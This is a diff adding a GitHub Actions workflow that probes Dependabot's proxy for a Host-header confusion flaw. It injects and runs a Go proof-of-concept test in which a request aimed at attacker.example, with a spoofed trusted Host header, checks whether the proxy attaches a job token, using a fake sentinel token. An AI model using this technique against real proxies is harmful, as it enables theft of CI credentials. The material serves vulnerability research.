@@ -1,0 +1,122 @@
+name: dependabot-job-token-host-confusion-probe
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/dependabot-job-token-host-confusion-probe.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout lab repository
+        uses: actions/checkout@v7
+        with:
+          path: verdict-repo
+
+      - name: Checkout current Dependabot proxy source
+        uses: actions/checkout@v7
+        with:
+          repository: dependabot/proxy
+          ref: cf74f6f9338ce8eb899ce8e472eaed6a19238a5b
+          path: proxy-src
+          persist-credentials: false
+
+      - name: Add harmless host-confusion regression test
+        shell: bash
+        run: |
+          cat > proxy-src/internal/handlers/job_token_host_confusion_poc_test.go <<'EOF'
+          package handlers
+
+          import (
+              "net/http/httptest"
+              "testing"
+
+              "github.com/dependabot/proxy/internal/config"
+          )
+
+          func TestJobTokenHostHeaderConfusionPoC(t *testing.T) {
+              const fakeToken = "FAKE_JOB_TOKEN_SENTINEL_7f1d9c"
+              const apiHost = "dependabot-api.example.internal"
+
+              h := NewDependabotAPIHandler(config.ProxyEnvSettings{
+                  APIEndpoint: "https://" + apiHost,
+                  JobToken: fakeToken,
+              })
+              if h == nil {
+                  t.Fatal("handler unexpectedly nil")
+              }
+
+              // Actual destination is attacker-controlled.
+              req := httptest.NewRequest("GET", "https://attacker.example/collect", nil)
+              // Spoof only the HTTP Host header to the trusted Dependabot API host.
+              req.Host = apiHost
+
+              req, resp := h.HandleRequest(req, nil)
+              if resp != nil {
+                  t.Fatalf("unexpected local response: %v", resp.StatusCode)
+              }
+
+              got := req.Header.Get("Authorization")
+              if got != fakeToken {
+                  t.Fatalf("expected fake job token to be injected, got %q", got)
+              }
+              if req.URL.Hostname() != "attacker.example" {
+                  t.Fatalf("destination changed unexpectedly: %q", req.URL.Hostname())
+              }
+
+              t.Logf("token_injected=true")
+              t.Logf("actual_destination=%s", req.URL.Hostname())
+              t.Logf("spoofed_host=%s", req.Host)
+          }
+          EOF
+
+      - name: Run exact package test
+        id: test
+        shell: bash
+        working-directory: proxy-src
+        run: |
+          set -o pipefail
+          go test ./internal/handlers -run TestJobTokenHostHeaderConfusionPoC -v 2>&1 | tee "$RUNNER_TEMP/poc.log"
+
+      - name: Record verdict
+        if: always()
+        shell: bash
+        run: |
+          set -euo pipefail
+          RESULT="$GITHUB_WORKSPACE/verdict-repo/security-probe-results/dependabot-job-token-host-confusion.txt"
+          mkdir -p "$(dirname "$RESULT")"
+          : > "$RESULT"
+          echo 'source_revision=cf74f6f9338ce8eb899ce8e472eaed6a19238a5b' >> "$RESULT"
+          if grep -q 'token_injected=true' "$RUNNER_TEMP/poc.log" 2>/dev/null; then
+            echo 'token_injected=true' >> "$RESULT"
+          else
+            echo 'token_injected=false' >> "$RESULT"
+          fi
+          if grep -q 'actual_destination=attacker.example' "$RUNNER_TEMP/poc.log" 2>/dev/null; then
+            echo 'actual_destination_preserved=true' >> "$RESULT"
+          else
+            echo 'actual_destination_preserved=false' >> "$RESULT"
+          fi
+          if grep -q 'spoofed_host=dependabot-api.example.internal' "$RUNNER_TEMP/poc.log" 2>/dev/null; then
+            echo 'trusted_host_spoof_accepted=true' >> "$RESULT"
+          else
+            echo 'trusted_host_spoof_accepted=false' >> "$RESULT"
+          fi
+
+      - name: Commit verdict
+        if: always()
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd verdict-repo
+          git config user.name 'github-actions[bot]'
+          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
+          git add security-probe-results/dependabot-job-token-host-confusion.txt
+          git commit -m 'Record Dependabot job-token Host confusion probe' || exit 0
+          git push
